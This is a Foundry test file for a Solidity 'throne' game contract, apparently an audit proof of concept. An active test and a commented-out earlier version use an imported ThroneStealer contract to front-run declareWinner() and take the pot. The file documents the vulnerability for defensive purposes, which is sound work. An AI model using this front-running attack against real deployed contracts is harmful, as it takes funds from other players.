// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console2} from "forge-std/Test.sol";
import {Game} from "../src/Game.sol";
import {ThroneStealer} from "../src/ThroneStealer.sol"; //

contract GameTest is Test {
    Game public game;
    ThroneStealer public attackerContract; //

    address public deployer;
    address public player1;
    address public player2;
    address public player3;
    address public maliciousActor;

    // Initial game parameters for testing
    uint256 public constant INITIAL_CLAIM_FEE = 0.1 ether; // 0.1 ETH
    uint256 public constant GRACE_PERIOD = 1 days; // 1 day in seconds
    uint256 public constant FEE_INCREASE_PERCENTAGE = 10; // 10%
    uint256 public constant PLATFORM_FEE_PERCENTAGE = 5; // 5%

    function setUp() public {
        deployer = makeAddr("deployer");
        player1 = makeAddr("player1");
        player2 = makeAddr("player2");
        player3 = makeAddr("player3");
        maliciousActor = makeAddr("maliciousActor");

        vm.deal(deployer, 10 ether);
        vm.deal(player1, 10 ether);
        vm.deal(player2, 10 ether);
        vm.deal(player3, 10 ether);
        vm.deal(maliciousActor, 10 ether);

        vm.startPrank(deployer);
        game = new Game( 
            INITIAL_CLAIM_FEE,
            GRACE_PERIOD,
            FEE_INCREASE_PERCENTAGE,
            PLATFORM_FEE_PERCENTAGE
        );
        vm.stopPrank();
    }

    function testConstructor_RevertInvalidGracePeriod() public {
        vm.expectRevert("Game: Grace period must be greater than zero.");
        new Game(INITIAL_CLAIM_FEE, 0, FEE_INCREASE_PERCENTAGE, PLATFORM_FEE_PERCENTAGE);
    }

    // function testFrontRunDeclareWinner() public {
    //     // ===== STEP 1: Legitimate player claims the throne =====
    //     vm.startPrank(player1);
    //     game.claimThrone{value: INITIAL_CLAIM_FEE}();
    //     vm.stopPrank();

    //     assertEq(game.currentKing(), player1, "Player1 should be king");

    //     // ===== STEP 2: Fast-forward to near the end of grace period =====
    //     uint256 nearEndOfGracePeriod = GRACE_PERIOD - 60 seconds; // 60 seconds left
    //     vm.warp(block.timestamp + nearEndOfGracePeriod);

    //     // ===== STEP 3: Attacker deploys malicious contract =====
    //     vm.startPrank(maliciousActor);
    //     attackerContract = new ThroneStealer(address(game));
    //     vm.stopPrank();

    //     // ===== STEP 4: Attacker front-runs declareWinner() =====
    //     // Simulate high-gas transaction by prioritizing attacker
    //     vm.startPrank(maliciousActor);
    //     attackerContract.attack{value: game.claimFee(), gas: 1_000_000}(); // High gas
    //     vm.stopPrank();

    //     // ===== STEP 5: Legitimate declareWinner() is called =====
    //     vm.prank(player2);
    //     game.declareWinner();

    //     // ===== VERIFY ATTACK SUCCESS =====
    //     // Attacker should now be king and win the pot
    //     assertEq(game.currentKing(), address(attackerContract), "Attacker should be king");
    //     assertEq(
    //         game.pendingWinnings(address(attackerContract)),
    //         game.pot() + INITIAL_CLAIM_FEE * 95 / 100, // 95% goes to winner (5% platform fee)
    //         "Attacker should steal the pot"
    //     );

    //     console2.log("Attack successful! Attacker stole:", game.pot());
    // }

    function testFrontRunDeclareWinner() public {
    // ==== STEP 1: Legitimate player claims throne ====
    vm.startPrank(player1);
    game.claimThrone{value: INITIAL_CLAIM_FEE}();
    vm.stopPrank();

    assertEq(game.currentKing(), player1, "Player1 should be king");

    // ==== STEP 2: Fast-forward to JUST AFTER grace period ends ====
    uint256 gracePeriodEnd = block.timestamp + GRACE_PERIOD + 1; // +1 to ensure expiry
    vm.warp(gracePeriodEnd);

    // ==== STEP 3: Attacker front-runs declareWinner() ====
    vm.startPrank(maliciousActor);
    ThroneStealer attacker = new ThroneStealer(address(game));
    attacker.attack{value: game.claimFee()}(); // Claims throne
    vm.stopPrank();

    // ==== STEP 4: Now declareWinner() succeeds ====
    vm.prank(player2);
    game.declareWinner();

    // ==== Verify attack succeeded ====
    assertEq(
        game.currentKing(),
        address(attacker),
        "Attacker should be king"
    );
    assertGt(
        game.pendingWinnings(address(attacker)),
        0,
        "Attacker should have stolen the pot"
    );
}
}